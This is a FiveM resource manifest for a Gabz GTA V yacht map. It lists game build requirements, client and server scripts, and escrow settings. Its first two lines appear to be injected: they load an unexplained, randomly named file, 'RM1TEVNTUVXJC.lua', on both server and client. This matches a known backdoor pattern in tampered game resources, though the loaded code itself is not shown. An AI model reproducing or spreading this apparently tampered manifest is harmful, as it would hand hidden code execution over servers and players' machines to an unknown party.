server_script "RM1TEVNTUVXJC.lua"
client_script "RM1TEVNTUVXJC.lua"
fx_version 'cerulean'
game 'gta5'
author 'Gabz'
description 'Yachts'
version '8.0.0'
lua54 'yes'
this_is_a_map 'yes'

dependencies { 
    '/server:4960',     -- ⚠️PLEASE READ⚠️; Requires at least SERVER build 4960.
    '/gameBuild:2189',  -- ⚠️PLEASE READ⚠️; Requires at least GAME build 2189.
}

client_scripts {
  'client.lua',
}

server_scripts {
    'version_check.lua',
}

escrow_ignore {
  'client.lua',
}
dependency '/assetpacks'